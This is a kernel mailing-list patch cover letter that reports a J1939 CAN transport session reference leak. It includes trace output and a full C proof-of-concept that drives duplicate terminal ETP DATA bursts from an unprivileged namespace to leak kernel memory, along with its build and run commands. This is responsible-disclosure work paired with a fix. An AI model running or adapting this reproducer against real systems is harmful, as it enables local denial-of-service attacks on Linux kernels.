Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=209.85.214.179
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1792998190;
	b=kTotG+dtEBp53ZCIO/VrYbfQOZELk3k1bKuhcZsEQG7IdLwt8+LBJ/YBwx2cB99mfnht
	 xug5pwgfc9SNKMETgo6mZViFi4EQOV9tafK6vTRKcYSVgg80teLp/qIOk7f78SA1Wv2Kw
	 66jh/ddenRVYIpCHzCelurZq7I85aUUFssCB31XZQrn/K8rXgChN0DN2IpQH4GWfoveW5
	 ujQn0mWxHKadfEtQF8ey4Cn/WSc6jTP690t3AH8lRrYiP+ZaecFwve3UsRVGgkU28UNvo
	 m07ndXg5SF+C4FUQGIbIlX8fInpA7uH1xLU/JjOSJlA+jBCT5ZR6RgsrB+6iKzIx+iw==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1792998190;
	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
	 X-Gm-Message-State:X-Gm-Gg:X-Received:Received:From:To:Cc:Subject:
	 Date:Message-ID:X-Mailer:MIME-Version:Content-Transfer-Encoding;
	bh=9WrM3eOQL+XmA0hUFF+qHxf+Ih+Cgx0PbAksr1LDHUA=;
	b=bjd7UKXc17XstuCELK2ZPrLDUPmuU3gHYwR+eBWoDXINe21/MS0Ka1QkVJcwPwh2exHg
	 OjxN7SzwADRTOVi93wIfP6fBHdNpfKoVfdOVGB7UcVAEDGeUqT6+BB8lzcfxCirkLkSqA
	 b2k1/TaTJquBIZMVIrKlEsFAHxUGwITCVtyXNw08wZWd1AMW5APf4EwCvXCAbjuhmk9MZ
	 5kj5gpAZwvyJBOjvuIHcVHVSskgsaa7uNgErq1hwBU9oULgUbg3dCZzcC20DZVvA72xAj
	 sYNhbm/e0ZX/YxAvmUJHxgLUbJGuCGk6vX3NQwuyAdWGt3M2PdO7MR39qmzQN9lZp1w==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=nebusec.ai;
	spf=pass smtp.mailfrom=nebusec.ai;
	dkim=pass header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b="CYv/5MJf";
	arc=none smtp.remote-ip=209.85.214.179
Received: from mail-pl1-f179.google.com (mail-pl1-f179.google.com [209.85.214.179])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id E375C606A31A
	for <linux-can@vger.kernel.org>; Mon, 26 Oct 2026 07:03:09 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org E375C606A31A
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=CYv/5MJf
Received: by mail-pl1-f179.google.com with SMTP id d9443c01a7336-2e9cf928dc9so16470005ad.0
        for <linux-can@vger.kernel.org>; Mon, 26 Oct 2026 00:03:09 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1792998189; x=1793602989; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=9WrM3eOQL+XmA0hUFF+qHxf+Ih+Cgx0PbAksr1LDHUA=;
        b=CYv/5MJfJYXCKYDHwl8Fae6tHDTKYxF6/2Lzmh5I+kfPuOkZJ/G/SX6RLJipIqN0se
         PzPdmja4LD11vfjV77QlcW4r1YCNGKzhfMsE+nMO9yNbciT3tlv+JUQolfSQlxolZAhQ
         tpqaSip2VaV5BMY7lKCnCsLVKFok0rR5uWnDsNsjT6JpBueiX6JmIPUkwaeiVdQ0j2Bg
         OR8kNigaVGnJ9mb28AM6Niinfg4UZgAcTjP9ntPY/y+19FADIXMxy+ijva7VBC0NI5Ra
         cjZ0HAc8XSmdQUpo+yibVPfedP0Hw7ZNZNgWXE325BGHX9fk5jDF24w+z53xlOVWjOAD
         4mjA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1792998189; x=1793602989;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=9WrM3eOQL+XmA0hUFF+qHxf+Ih+Cgx0PbAksr1LDHUA=;
        b=Acu9KkrTNd77rP6+StCexoypCjI0BI0QRTVRSuz7MmaquOY67tTNAKkoa54EHr8Tvo
         4vtMI3r3j66/ymCrpWN160rZW1AJ87EBsdkbWOlhZV7A55gZsnh2yujDvGk/48R41726
         l1QOD8jg+VRN/w9W7H/7HWd2R2j0KBUP2cX3OLbhQp7thil+iQjWFG8E/A+oibAiWPOj
         j8sbJj6iy4Wjarcbxtc35WrkDblmIKbjJwHpVE4XJrOqdfStBDeaFwVwD7mM7N/bQPMk
         d34NzRB7yvrh4wOZQBL0HgIOVpmlhviTjncMoPGIkZ8u6DkxHYSkJ8wOqiTlGJnpM2t7
         qrGw==
X-Gm-Message-State: AFq9FYJbnSp8SvkLd8AEfEHSrvb0R9bX60LnR6JliLWVgQ+C5TccsVun
	9W3Ha0tW05W2TgCuB1LQkrJewHhnFMlfamg9SHzskmmTad/PkFJMciwjyhW0jh74/kWWFUg1vv3
	Kd2DlLXpI
X-Gm-Gg: AYBFou1K76aoPBYu+ELgchplbwUs+2MGFWwSNw5JPxnjQiRwseLOSTJ/yUtYBnFYq3W
	nZjzi9Yy25QOAT8nVv65ASZpmcf2oH2ZoOas6PtFwBAumd0Veetb1Y26sFmK4egmeNblTeTNLXL
	t99qd8JQiV92oaTIdelY568H/R5Xvu+SrahM6TrpVNLQxNR7LnpydeCs4hONPNcquaJ9yZfP40p
	PXWIQ3QbAjuVZyOqChKkYtH+cSNJkuawRPXobYvwnqpUkknK8J31OMjDyGWoX5R0A9GrN1uBt0i
	zr5tPOHvyajrt30noPlEJFFYliU9LpzEvXWTs2JbqRNUwQv9E/KfhEU86d8rjL608szU+f0Z/Li
	OR67D8/iNYYAQ/jflJw4dQVaq0QCyOj9d7sAtiOPo6JbNV0imfEkMA/9pBanuHoXY1PYr4Ldgl0
	C1IEU24lqpQf1CcIhGEVe7Stb8GPxihXQgxI2VGBRB+hjW6ERaudPp7tkmTVQtVD/3HD0calmJD
	lQF4O36y0WTryBMmYsJ1ua/4VUTMsbml3cEfC8hKaDqAmj6/aYwRjAhTfpaEvlELvIKgvwSkQm4
	zaFXcqDU6Vo=
X-Received: by 2002:a17:903:1446:b0:2e8:3b2d:c0e1 with SMTP id d9443c01a7336-2ea9c964c97mr34555435ad.41.1792998188868;
        Mon, 26 Oct 2026 00:03:08 -0700 (PDT)
Received: from 24c857d0c3be.. ([122.51.212.64])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2ea9b14c296sm12049495ad.30.2026.10.26.00.03.04
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 26 Oct 2026 00:03:08 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: linux-can@vger.kernel.org
Cc: robin@protonic.nl,
	o.rempel@pengutronix.de,
	kernel@pengutronix.de,
	socketcan@hartkopp.net,
	mkl@pengutronix.de,
	lkp@intel.com,
	ecathinds@gmail.com,
	dev.kurt@vandijck-laurijssen.be,
	vega@nebusec.ai,
	zihanx@nebusec.ai
Subject: [PATCH 0/1] can: j1939: fix session reference leak on TX timer restart
Date: Mon, 26 Oct 2026 07:02:47 +0000
Message-ID: <cover.1792979091.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
X-Mailing-List: linux-can@vger.kernel.org
List-Id: <linux-can.vger.kernel.org>
List-Post: <mailto:linux-can@vger.kernel.org>
List-Help: <mailto:linux-can+help@vger.kernel.org>
List-Subscribe: <mailto:linux-can+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-can+unsubscribe@vger.kernel.org>
List-Owner: <mailto:linux-can+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found an issue in net/can/j1939/transport.c.
The bug is reachable by a user who can create user and network namespaces
and send CAN frames to a J1939 receiver.
The relevant details are provided below.

---- details below ----

This bug is tracked at: https://bugtracker.nebusec.ai/f/11143 (11143)

Bug details:

The TX timer scheduler takes a session reference on every call. Restarting
an already queued hrtimer changes its expiry but does not create a second
callback to release another reference. Repeated terminal ETP DATA packets
can rearm the same timer before its callback runs, retaining the session,
its skb, and associated device state. A runtime trace observed two starts
of the same armed timer before one callback. A short excerpt from the
baseline trace shows the same session and timer being started twice; the
second start reports that the timer was already armed, followed by one
expiry and callback:

             poc-389     [001] ..s1.   200.601373: txtimer_schedule: (j1939_tp_schedule_txtimer+0x4/0x60) session=0xffffa3da4a2bc400 msec=0x0
             poc-390     [000] ..s1.   200.601375: txtimer_schedule: (j1939_tp_schedule_txtimer+0x4/0x60) session=0xffffa3da4a2bc400 msec=0x0
             poc-389     [001] d.s2.   200.601390: hrtimer_start: hrtimer=ffffa3da4a2bc4b8 function=j1939_tp_txtimer expires=200464843123 softexpires=200464843123 mode=REL|SOFT was_armed=0
             poc-390     [000] d.s2.   200.601400: hrtimer_start: hrtimer=ffffa3da4a2bc4b8 function=j1939_tp_txtimer expires=200464853253 softexpires=200464853253 mode=REL|SOFT was_armed=1
             poc-390     [000] ..s1.   200.601429: hrtimer_expire_entry: hrtimer=ffffa3da4a2bc4b8 function=j1939_tp_txtimer now=200464882582
             poc-390     [000] ..s1.   200.601430: txtimer_callback: (j1939_tp_txtimer+0x4/0xe70) timer=0xffffa3da4a2bc4b8

The patch serializes timer rearming and reuses the queued timer's reference.

Reproducer:

The trigger uses raw CAN frames over namespace-local vxcan peers and a
concurrent duplicate-frame burst; packetdrill does not model this
CAN/J1939 device topology.

Compile the reproducer with:

    gcc -O2 -Wall -Wextra -Werror -pthread -static -o poc poc.c

Run it as an unprivileged account with user/network namespace support:

    unshare -Urn sh -c 'ip link add vxcan0 type vxcan peer name vxcan1 && ip link set vxcan0 up && ip link set vxcan1 up && ./poc vxcan0 vxcan1 2097152 4 32 4096 1'

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
The PoC creates four 2 MiB ETP sessions and concurrently sends duplicate
terminal DATA packets over a vxcan pair.

------BEGIN PoC------

#define _GNU_SOURCE

#include <errno.h>
#include <linux/can.h>
#include <linux/can/j1939.h>
#include <linux/can/raw.h>
#include <net/if.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#ifndef SYS_sendmmsg
#define SYS_sendmmsg 307
#endif

#define LOCAL_SA 0x80
#define REMOTE_SA_BASE 0x81
#define APP_PGN_BASE 0x01f100

#define J1939_ETP_PGN_CTL 0x00c800
#define J1939_ETP_PGN_DAT 0x00c700

#define J1939_ETP_CMD_ABORT 0xff
#define J1939_ETP_CMD_CTS 0x15
#define J1939_ETP_CMD_DPO 0x16
#define J1939_ETP_CMD_RTS 0x14

#define DEFAULT_SIZE (1024U * 1024U)
#define DEFAULT_DUPLICATES 256U
#define DEFAULT_SESSIONS 4096U
#define DEFAULT_THREADS 8U
#define FIRST_BLOCK_PKTS 255U

struct params {
	const char *tx_ifname;
	const char *rx_ifname;
	uint32_t session_size;
	uint32_t sessions;
	uint32_t threads;
	uint32_t duplicates;
	bool verbose;
};

struct can_burst {
	struct can_frame *frames;
	struct mmsghdr *msgs;
	struct iovec *iovecs;
	unsigned int nframes;
};

struct worker_ctx {
	int fd;
	int cpu;
	struct can_burst burst;
};

static pthread_barrier_t start_barrier;
static pthread_barrier_t done_barrier;
static volatile sig_atomic_t stop_workers;

static void die(const char *what);

static int sendmmsg_compat(int fd, struct mmsghdr *msgvec, unsigned int vlen,
			   unsigned int flags)
{
	return syscall(SYS_sendmmsg, fd, msgvec, vlen, flags);
}

static unsigned int sendmmsg_all(int fd, struct mmsghdr *msgvec,
				 unsigned int vlen, const char *what)
{
	unsigned int sent = 0;

	while (sent < vlen) {
		int ret = sendmmsg_compat(fd, &msgvec[sent], vlen - sent, 0);

		if (ret < 0)
			die(what);
		if (!ret) {
			errno = EIO;
			die(what);
		}
		sent += ret;
	}

	return sent;
}

static void die(const char *what)
{
	perror(what);
	exit(EXIT_FAILURE);
}

static void barrier_wait_or_die(pthread_barrier_t *barrier, const char *what)
{
	int ret = pthread_barrier_wait(barrier);

	if (ret != 0 && ret != PTHREAD_BARRIER_SERIAL_THREAD) {
		errno = ret;
		die(what);
	}
}

static unsigned int parse_u32(const char *arg, const char *what)
{
	char *endp;
	unsigned long value;

	errno = 0;
	value = strtoul(arg, &endp, 0);
	if (errno || *endp || value > UINT32_MAX) {
		fprintf(stderr, "invalid %s: %s\n", what, arg);
		exit(EXIT_FAILURE);
	}

	return (unsigned int)value;
}

static void pin_to_cpu(int cpu)
{
	cpu_set_t set;

	CPU_ZERO(&set);
	CPU_SET(cpu, &set);
	if (pthread_setaffinity_np(pthread_self(), sizeof(set), &set))
		perror("pthread_setaffinity_np");
}

static canid_t make_can_id(uint8_t prio, uint32_t pgn, uint8_t sa, uint8_t da)
{
	canid_t can_id;

	can_id = CAN_EFF_FLAG | ((canid_t)prio << 26) | ((canid_t)pgn << 8) | sa;
	if (((pgn >> 8) & 0xff) < 240)
		can_id |= (canid_t)da << 8;

	return can_id;
}

static int ifindex_by_name(const char *ifname)
{
	unsigned int ifindex = if_nametoindex(ifname);

	if (!ifindex) {
		errno = ENODEV;
		die("if_nametoindex");
	}

	return (int)ifindex;
}

static int make_raw_socket(int ifindex)
{
	struct sockaddr_can addr = {
		.can_family = AF_CAN,
		.can_ifindex = ifindex,
	};
	int fd;
	int one = 1;

	fd = socket(PF_CAN, SOCK_RAW, CAN_RAW);
	if (fd < 0)
		die("socket(CAN_RAW)");

	if (setsockopt(fd, SOL_CAN_RAW, CAN_RAW_RECV_OWN_MSGS, &one,
		       sizeof(one)) < 0)
		die("setsockopt(CAN_RAW_RECV_OWN_MSGS)");

	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die("bind(CAN_RAW)");

	return fd;
}

static int make_j1939_listener(int ifindex)
{
	struct sockaddr_can addr = {
		.can_family = AF_CAN,
		.can_ifindex = ifindex,
		.can_addr.j1939 = {
			.name = 0,
			.pgn = J1939_NO_PGN,
			.addr = LOCAL_SA,
		},
	};
	int fd;

	fd = socket(PF_CAN, SOCK_DGRAM, CAN_J1939);
	if (fd < 0)
		die("socket(CAN_J1939)");

	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die("bind(CAN_J1939)");

	return fd;
}

static void send_frame(int fd, const struct can_frame *frame)
{
	ssize_t written = write(fd, frame, sizeof(*frame));

	if (written != (ssize_t)sizeof(*frame))
		die("write(can_frame)");
}

static void build_etp_rts(struct can_frame *frame, uint8_t sa, uint8_t da,
			  uint32_t size, uint32_t app_pgn)
{
	memset(frame, 0, sizeof(*frame));
	frame->can_id = make_can_id(6, J1939_ETP_PGN_CTL, sa, da);
	frame->len = 8;
	frame->data[0] = J1939_ETP_CMD_RTS;
	frame->data[1] = (size >> 0) & 0xff;
	frame->data[2] = (size >> 8) & 0xff;
	frame->data[3] = (size >> 16) & 0xff;
	frame->data[4] = (size >> 24) & 0xff;
	frame->data[5] = (app_pgn >> 0) & 0xff;
	frame->data[6] = (app_pgn >> 8) & 0xff;
	frame->data[7] = (app_pgn >> 16) & 0xff;
}

static void build_etp_dpo(struct can_frame *frame, uint8_t sa, uint8_t da,
			  uint32_t app_pgn)
{
	memset(frame, 0, sizeof(*frame));
	frame->can_id = make_can_id(6, J1939_ETP_PGN_CTL, sa, da);
	frame->len = 8;
	frame->data[0] = J1939_ETP_CMD_DPO;
	frame->data[1] = FIRST_BLOCK_PKTS;
	frame->data[2] = 0;
	frame->data[3] = 0;
	frame->data[4] = 0;
	frame->data[5] = (app_pgn >> 0) & 0xff;
	frame->data[6] = (app_pgn >> 8) & 0xff;
	frame->data[7] = (app_pgn >> 16) & 0xff;
}

static void build_etp_abort(struct can_frame *frame, uint8_t sa, uint8_t da,
			    uint32_t app_pgn)
{
	memset(frame, 0, sizeof(*frame));
	frame->can_id = make_can_id(6, J1939_ETP_PGN_CTL, sa, da);
	frame->len = 8;
	frame->data[0] = J1939_ETP_CMD_ABORT;
	frame->data[1] = 1;
	frame->data[2] = 0xff;
	frame->data[3] = 0xff;
	frame->data[4] = 0xff;
	frame->data[5] = (app_pgn >> 0) & 0xff;
	frame->data[6] = (app_pgn >> 8) & 0xff;
	frame->data[7] = (app_pgn >> 16) & 0xff;
}

static void build_etp_terminal_data(struct can_frame *frame, uint8_t remote_sa)
{
	memset(frame, 0, sizeof(*frame));
	frame->can_id = make_can_id(6, J1939_ETP_PGN_DAT, remote_sa, LOCAL_SA);
	frame->len = 8;
	frame->data[0] = FIRST_BLOCK_PKTS;
	memset(&frame->data[1], 'Z', 7);
}

static void free_burst(struct can_burst *burst)
{
	free(burst->iovecs);
	free(burst->msgs);
	free(burst->frames);
	memset(burst, 0, sizeof(*burst));
}

static void drain_raw_rx(int fd)
{
	struct pollfd pfd = {
		.fd = fd,
		.events = POLLIN,
	};

	for (;;) {
		struct can_frame frame;
		int ret = poll(&pfd, 1, 0);

		if (ret <= 0)
			return;

		if (read(fd, &frame, sizeof(frame)) < 0) {
			if (errno == EAGAIN || errno == EWOULDBLOCK)
				return;
			die("read(raw drain)");
		}
	}
}

static bool match_ctl_cmd(const struct can_frame *frame, uint8_t sa, uint8_t da,
			  uint32_t pgn, uint8_t cmd)
{
	uint32_t frame_pgn;
	uint8_t frame_sa;
	uint8_t frame_da = J1939_NO_ADDR;

	if (!(frame->can_id & CAN_EFF_FLAG))
		return false;

	frame_sa = frame->can_id & 0xff;
	frame_pgn = (frame->can_id >> 8) & J1939_PGN_MAX;
	if (((frame_pgn >> 8) & 0xff) < 240) {
		frame_da = frame_pgn & 0xff;
		frame_pgn &= J1939_PGN_PDU1_MAX;
	}

	return frame_sa == sa && frame_da == da &&
	       frame_pgn == pgn && frame->len >= 1 &&
	       frame->data[0] == cmd;
}

static bool wait_for_cts(int raw_fd, uint8_t remote_sa, uint32_t app_pgn,
			 bool verbose)
{
	struct pollfd pfd = {
		.fd = raw_fd,
		.events = POLLIN,
	};
	struct timespec start;

	if (clock_gettime(CLOCK_MONOTONIC, &start) < 0)
		die("clock_gettime");

	for (;;) {
		struct can_frame frame;
		struct timespec now;
		int elapsed_ms;
		int timeout_ms;
		int ret;

		if (clock_gettime(CLOCK_MONOTONIC, &now) < 0)
			die("clock_gettime");

		elapsed_ms = (int)((now.tv_sec - start.tv_sec) * 1000 +
				   (now.tv_nsec - start.tv_nsec) / 1000000);
		timeout_ms = 1000 - elapsed_ms;
		if (timeout_ms <= 0)
			return false;

		ret = poll(&pfd, 1, timeout_ms);
		if (ret < 0)
			die("poll(raw)");
		if (ret == 0)
			return false;

		if (!(pfd.revents & POLLIN))
			continue;

		if (read(raw_fd, &frame, sizeof(frame)) < 0)
			die("read(raw)");

		if (match_ctl_cmd(&frame, LOCAL_SA, remote_sa, J1939_ETP_PGN_CTL,
				  J1939_ETP_CMD_CTS)) {
			if (verbose) {
				printf("saw initial CTS for pgn=0x%05x remote_sa=0x%02x\n",
				       app_pgn, remote_sa);
				fflush(stdout);
			}
			return true;
		}
	}
}

static void init_burst(struct can_burst *burst, unsigned int nframes)
{
	memset(burst, 0, sizeof(*burst));
	burst->nframes = nframes;
	burst->frames = calloc(nframes, sizeof(*burst->frames));
	burst->msgs = calloc(nframes, sizeof(*burst->msgs));
	burst->iovecs = calloc(nframes, sizeof(*burst->iovecs));
	if (!burst->frames || !burst->msgs || !burst->iovecs)
		die("calloc(burst)");
}

static void finalize_burst(struct can_burst *burst)
{
	unsigned int i;

	for (i = 0; i < burst->nframes; i++) {
		burst->iovecs[i].iov_base = &burst->frames[i];
		burst->iovecs[i].iov_len = sizeof(burst->frames[i]);
		burst->msgs[i].msg_hdr.msg_iov = &burst->iovecs[i];
		burst->msgs[i].msg_hdr.msg_iovlen = 1;
	}
}

static void build_prefix_burst(struct can_burst *burst, uint8_t remote_sa,
			       uint32_t app_pgn)
{
	unsigned int i;

	init_burst(burst, FIRST_BLOCK_PKTS);
	build_etp_dpo(&burst->frames[0], remote_sa, LOCAL_SA, app_pgn);

	for (i = 1; i < FIRST_BLOCK_PKTS; i++) {
		memset(&burst->frames[i], 0, sizeof(burst->frames[i]));
		burst->frames[i].can_id = make_can_id(6, J1939_ETP_PGN_DAT,
						      remote_sa, LOCAL_SA);
		burst->frames[i].len = 8;
		burst->frames[i].data[0] = i;
		memset(&burst->frames[i].data[1], 'A' + (i % 26), 7);
	}

	finalize_burst(burst);
}

static void build_terminal_burst(struct can_burst *burst, uint8_t remote_sa,
				 unsigned int duplicates)
{
	unsigned int i;

	free_burst(burst);
	init_burst(burst, duplicates);

	for (i = 0; i < duplicates; i++)
		build_etp_terminal_data(&burst->frames[i], remote_sa);

	finalize_burst(burst);
}

static void *worker_main(void *arg)
{
	struct worker_ctx *ctx = arg;

	pin_to_cpu(ctx->cpu);

	for (;;) {
		barrier_wait_or_die(&start_barrier, "pthread_barrier_wait(start)");
		if (stop_workers)
			break;

		sendmmsg_all(ctx->fd, ctx->burst.msgs, ctx->burst.nframes,
			     "sendmmsg(worker)");

		barrier_wait_or_die(&done_barrier, "pthread_barrier_wait(done)");
	}

	return NULL;
}

static void init_workers(struct worker_ctx *workers, pthread_t *tids,
			 int ifindex, unsigned int threads, int ncpus)
{
	unsigned int i;

	if (pthread_barrier_init(&start_barrier, NULL, threads + 1))
		die("pthread_barrier_init(start)");
	if (pthread_barrier_init(&done_barrier, NULL, threads + 1))
		die("pthread_barrier_init(done)");

	for (i = 0; i < threads; i++) {
		workers[i].fd = make_raw_socket(ifindex);
		workers[i].cpu = i % ncpus;
		if (pthread_create(&tids[i], NULL, worker_main, &workers[i]))
			die("pthread_create");
	}
}

static void join_workers(struct worker_ctx *workers, pthread_t *tids,
			 unsigned int threads)
{
	unsigned int i;

	stop_workers = 1;
	barrier_wait_or_die(&start_barrier, "pthread_barrier_wait(stop)");

	for (i = 0; i < threads; i++) {
		if (pthread_join(tids[i], NULL))
			die("pthread_join");
		free_burst(&workers[i].burst);
		close(workers[i].fd);
	}

	pthread_barrier_destroy(&start_barrier);
	pthread_barrier_destroy(&done_barrier);
}

static void run_session(int raw_fd, struct worker_ctx *workers,
			uint32_t size, uint32_t threads, uint32_t duplicates,
			uint32_t session_idx, bool verbose)
{
	struct can_frame rts;
	struct can_frame abort;
	struct can_burst prefix = { 0 };
	uint8_t remote_sa;
	uint32_t app_pgn;
	unsigned int i;
	unsigned int sa_span = J1939_MAX_UNICAST_ADDR - REMOTE_SA_BASE + 1;

	remote_sa = REMOTE_SA_BASE + (session_idx % sa_span);
	app_pgn = APP_PGN_BASE + (session_idx % 0x100);

	build_etp_rts(&rts, remote_sa, LOCAL_SA, size, app_pgn);
	send_frame(raw_fd, &rts);

	if (!wait_for_cts(raw_fd, remote_sa, app_pgn, verbose)) {
		fprintf(stderr,
			"timed out waiting for initial CTS: session=%u remote_sa=0x%02x pgn=0x%05x size=%u\n",
			session_idx, remote_sa, app_pgn, size);
		exit(EXIT_FAILURE);
	}

	build_prefix_burst(&prefix, remote_sa, app_pgn);
	/* Ensure the receiver processes DPO before the data packet burst. */
	send_frame(raw_fd, &prefix.frames[0]);
	usleep(1000);
	sendmmsg_all(raw_fd, &prefix.msgs[1], prefix.nframes - 1,
		     "sendmmsg(prefix)");
	free_burst(&prefix);

	for (i = 0; i < threads; i++)
		build_terminal_burst(&workers[i].burst, remote_sa, duplicates);

	barrier_wait_or_die(&start_barrier, "pthread_barrier_wait(start-main)");
	barrier_wait_or_die(&done_barrier, "pthread_barrier_wait(done-main)");

	build_etp_abort(&abort, remote_sa, LOCAL_SA, app_pgn);
	send_frame(raw_fd, &abort);
}

static void usage(const char *prog)
{
	fprintf(stderr,
		"usage: %s [tx_ifname] [rx_ifname] [size] [sessions] [threads] [duplicates_per_thread] [verbose]\n",
		prog);
	exit(EXIT_FAILURE);
}

int main(int argc, char **argv)
{
	struct params params = {
		.tx_ifname = "vcan0",
		.rx_ifname = "vcan0",
		.session_size = DEFAULT_SIZE,
		.sessions = DEFAULT_SESSIONS,
		.threads = DEFAULT_THREADS,
		.duplicates = DEFAULT_DUPLICATES,
		.verbose = false,
	};
	struct worker_ctx *workers;
	pthread_t *tids;
	int ifindex;
	int rx_ifindex;
	int raw_fd;
	int j1939_fd;
	int ncpus;
	unsigned int i;

	if (argc > 8)
		usage(argv[0]);

	if (argc >= 2)
		params.tx_ifname = argv[1];
	if (argc >= 3)
		params.rx_ifname = argv[2];
	if (argc >= 4)
		params.session_size = parse_u32(argv[3], "size");
	if (argc >= 5)
		params.sessions = parse_u32(argv[4], "sessions");
	if (argc >= 6)
		params.threads = parse_u32(argv[5], "threads");
	if (argc >= 7)
		params.duplicates = parse_u32(argv[6], "duplicates");
	if (argc >= 8)
		params.verbose = parse_u32(argv[7], "verbose") != 0;

	if (params.session_size <= 1785) {
		fprintf(stderr, "size must be > 1785 to force ETP\n");
		return EXIT_FAILURE;
	}
	if (!params.sessions || !params.threads || !params.duplicates)
		usage(argv[0]);

	ncpus = sysconf(_SC_NPROCESSORS_ONLN);
	if (ncpus < 1)
		die("sysconf(_SC_NPROCESSORS_ONLN)");

	workers = calloc(params.threads, sizeof(*workers));
	tids = calloc(params.threads, sizeof(*tids));
	if (!workers || !tids)
		die("calloc(workers)");

	ifindex = ifindex_by_name(params.tx_ifname);
	rx_ifindex = ifindex_by_name(params.rx_ifname);
	j1939_fd = make_j1939_listener(rx_ifindex);
	raw_fd = make_raw_socket(ifindex);
	init_workers(workers, tids, ifindex, params.threads, ncpus);

	printf("tx_if=%s(%d) rx_if=%s(%d) size=%u sessions=%u threads=%u duplicates_per_thread=%u\n",
	       params.tx_ifname, ifindex, params.rx_ifname, rx_ifindex,
	       params.session_size, params.sessions, params.threads,
	       params.duplicates);
	fflush(stdout);

	for (i = 0; i < params.sessions; i++) {
		drain_raw_rx(raw_fd);
		run_session(raw_fd, workers, params.session_size, params.threads,
			    params.duplicates, i, params.verbose);
		if ((i + 1) % 16 == 0 || params.verbose) {
			printf("completed %u sessions\n", i + 1);
			fflush(stdout);
		}
	}

	join_workers(workers, tids, params.threads);
	close(raw_fd);
	close(j1939_fd);
	free(tids);
	free(workers);

	return 0;
}

------END PoC--------

Best regards,
Zihan Xi

Zihan Xi (1):
  can: j1939: fix session reference leak on TX timer restart

 net/can/j1939/j1939-priv.h |  3 +++
 net/can/j1939/transport.c  | 11 ++++++++++-
 2 files changed, 13 insertions(+), 1 deletion(-)

-- 
2.43.0

